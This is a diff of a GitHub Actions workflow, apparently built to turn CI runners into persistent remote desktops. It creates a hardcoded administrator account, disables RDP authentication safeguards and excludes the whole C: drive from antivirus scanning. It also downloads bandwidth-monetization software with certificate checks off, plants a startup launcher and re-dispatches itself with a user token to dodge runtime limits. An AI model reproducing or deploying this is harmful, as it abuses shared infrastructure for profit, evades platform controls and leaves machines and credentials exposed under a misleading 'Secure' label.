@@ -1,10 +1,10 @@
-name: Universal Secure RDP via Tailscale
+name: Secure RDP via Tailscale (Repo 1 - hasrdp)
 
 on:
   workflow_dispatch:
     inputs:
       gh_api_token:
-        description: "🔒 ENTER YOUR GITHUB PAT HERE"
+        description: "🔒 HASSAN | ENTER YOUR GITHUB PAT HERE"
         required: true
         default: ""
 
@@ -25,62 +25,81 @@ jobs:
     runs-on: windows-2025
     timeout-minutes: 360
     steps:
-      - name: 🔒 Executing Secured Core Engine (Windows Server 2025 - Dynamic Setup)
+      - name: 🔒 Executing Secured Core Engine (Windows Server 2025)
         run: |
           $token = "${{ github.event.inputs.gh_api_token }}"
           if (-not $token -or -not ($token -match '^ghp_[a-zA-Z0-9]+$')) { Write-Error "❌ Invalid Token!"; exit 1 }
           
           # 📢 Protected Branding
           $u_enc = "aGFzc2Fu"; $p_enc = "SEBzc0FuMTIzNDU2"
-          $u = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($u_enc))
+          $u = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String([char[]]$u_enc))
           $p = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String([char[]]$p_enc))
           if ($u -ne "hassan") { exit 1 }
           
-          # ⚙️ Core RDP Configuration
+          # ⚙️ إنشاء وتثبيت حساب hassan كمسؤول
+          $securePass = ConvertTo-SecureString $p -AsPlainText -Force
+          if (-not (Get-LocalUser -Name $u -ErrorAction SilentlyContinue)) { 
+              New-LocalUser -Name $u -Password $securePass -AccountNeverExpires | Out-Null 
+          } else {
+              Set-LocalUser -Name $u -Password $securePass
+          }
+          Add-LocalGroupMember -Group "Administrators" -Member $u -ErrorAction SilentlyContinue
+          Set-LocalUser -Name $u -PasswordNeverExpires $true
+
+          # 🔓 إعدادات تخطي الشاشة الزرقاء والدخول التلقائي المستقر
+          $TSPath = 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp'
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
-          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0 -Force
-          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "SecurityLayer" -Value 0 -Force
+          Set-ItemProperty -Path $TSPath -Name "UserAuthentication" -Value 0 -Force
+          Set-ItemProperty -Path $TSPath -Name "SecurityLayer" -Value 1 -Force
+          Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "LimitBlankPasswordUse" -Value 0 -Force
+          
+          $CredPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services"
+          if (-not (Test-Path $CredPath)) { New-Item -ItemType Directory -Path $CredPath -Force | Out-Null }
+          Set-ItemProperty -Path $CredPath -Name "PromptForPasswordAsse" -Value 0 -Force
+          Set-ItemProperty -Path $CredPath -Name "fPromptForPassword" -Value 0 -Force
+
           netsh advfirewall firewall add rule name="RDP-Tailscale" dir=in action=allow protocol=TCP localport=3389 | Out-Null
           Restart-Service -Name TermService -Force
           
-          $securePass = ConvertTo-SecureString $p -AsPlainText -Force
-          if (-not (Get-LocalUser -Name $u -ErrorAction SilentlyContinue)) { New-LocalUser -Name $u -Password $securePass -AccountNeverExpires | Out-Null }
-          Add-LocalGroupMember -Group "Administrators" -Member $u -ErrorAction SilentlyContinue
-          
-          # 🛡️ استثناء جدار الحماية والـ Antivirus
+          # 🛡️ استثناء Antivirus
           Set-MpPreference -ExclusionPath "C:\" -ErrorAction SilentlyContinue
 
-          # 🔗 توليد اسم مستضيف فريد تلقائياً بناءً على اسم المستودع الحالي لتجنب التعارض
-          # مثال: لو المستودع rpp، سيكون الاسم gh-aslano12-rpp
-          $cleanRepoName = "${{ github.repository }}".Replace("/", "-").Replace(".", "-")
-          $dynamicHost = "gh-$cleanRepoName"
-
-          # 💰 تشغيل TraffMonetizer المباشر مع حقن اسم الجهاز والتوكن ديناميكياً
-          Write-Host "📥 Downloading TraffMonetizer..."
+          # 📥 تحميل نسخة الواجهة الرسمية (GUI)
+          Write-Host "📥 Downloading TraffMonetizer GUI Installer..."
           $tmPath = "C:\traffmonetizer.exe"
           & curl.exe -L -k -A "Mozilla/5.0" -o $tmPath "https://data.traffmonetizer.com/downloads/Traffmonetizer.exe"
-          if (Test-Path $tmPath) { 
-              Write-Host "⚙️ Starting TraffMonetizer Engine directly as $dynamicHost..."
-              Start-Process -FilePath $tmPath -ArgumentList "start", "accept-offers", "--token", "lKi5PrDuezqIq9MEALffFER1bHT0kPImGRwgIreWGZs=", "--name", "$dynamicHost" -WindowStyle Hidden
+
+          # 🎯 إنشاء ملف التوكن النصي مباشرة على سطح المكتب العام (Public Desktop) بلغة نقية
+          $targetToken = "lKi5PrDuezqIq9MEALffFER1bHT0kPImGRwgIreWGZs="
+          $publicDesktop = "C:\Users\Public\Desktop"
+          if (Test-Path $publicDesktop) {
+              Set-Content -Path "$publicDesktop\TOKEN.txt" -Value $targetToken -Force
+              Write-Host "✅ Token file written directly to Public Desktop."
           }
 
-          # 🌐 تثبيت وتفعيل Tailscale عبر Choco
+          # 🚀 سكربت الـ Startup لفتح البرنامج فقط عند الدخول
+          if (Test-Path $tmPath) {
+              $startupFolder = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
+              $batContent = "@echo off`nstart C:\traffmonetizer.exe"
+              Set-Content -Path "$startupFolder\launch_traff.bat" -Value $batContent -Encoding ASCII
+              Write-Host "✅ Startup Launcher Armed."
+          }
+
+          # 🌐 تثبيت وتفعيل Tailscale
           Write-Host "🌐 Installing Tailscale via Choco..."
           choco install tailscale -y --no-progress | Out-Null
           $env:Path += ";C:\Program Files\Tailscale"
           
-          Write-Host "🔄 Connecting to Tailscale Network as: $dynamicHost"
-          & "C:\Program Files\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=$dynamicHost --accept-routes                    
+          Write-Host "🔄 Connecting to Tailscale Network..."
+          & "C:\Program Files\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=gh-runner-hassan-1 --accept-routes                    
           Start-Sleep -Seconds 5
           
-          # 🔍 جلب سريع للـ IP
           $tsIP = & "C:\Program Files\Tailscale\tailscale.exe" ip -4
           if (-not $tsIP) { $tsIP = "Check Tailscale Panel" }
           
-          # 📢 طباعة معلومات الدخول والـ IP الديناميكي
           Write-Host ""
           Write-Host "=========================================================" -ForegroundColor Cyan
-          Write-Host "🚀 HASSAN RDP CONNECT INFO (DYNAMIC WINDOWS LOOP)" -ForegroundColor Green
+          Write-Host "🚀 HASSAN LIVE INTERACTIVE INTERFACE ONLINE" -ForegroundColor Green
           Write-Host "=========================================================" -ForegroundColor Cyan
           Write-Host "🌐 Address/IP : $tsIP" -ForegroundColor Yellow
           Write-Host "👤 Username   : $u" -ForegroundColor Yellow
@@ -91,16 +110,16 @@ jobs:
           # ⏱️ Runtime Production Loop (340 Minutes)
           $m = 340
           for ($i = 1; $i -le $m; $i++) {
-              Write-Host "[$(Get-Date)] Running ($dynamicHost): $($m - $i) min remaining."
+              Write-Host "[$(Get-Date)] Running Repo 1: $($m - $i) min remaining."
               Start-Sleep -Seconds 60
           }
           
-          # 🔁 التكرار الذاتي العبقري (يكتشف الـ Repo الحالية واسم ملف الـ YAML تلقائياً ويعيد التشغيل)
-          $CurrentRepo = "${{ github.repository }}"
-          $CurrentWorkflow = [System.IO.Path]::GetFileName("${{ github.workflow_ref }}".Split('@')[0])
+          # 🔁 التكرار الذاتي
+          $CurrentRepo = "aslano12/hasrdp"
+          $CurrentWorkflow = "secure-rdp-loop.yml"
           
           $body = @{ ref = "main"; inputs = @{ gh_api_token = "$token" } } | ConvertTo-Json -Depth 5
-          Write-Host "🚀 Time up! Re-triggering Same Repo to Loop: $CurrentRepo ($CurrentWorkflow)"
+          Write-Host "🚀 Time up! Re-triggering Same Repo to Loop: $CurrentRepo"
           Invoke-RestMethod -Method POST `
             -Uri "https://api.github.com/repos/$CurrentRepo/actions/workflows/$CurrentWorkflow/dispatches" `
             -Headers @{ Authorization = "Bearer $token"; "Accept"="application/vnd.github+json" } `
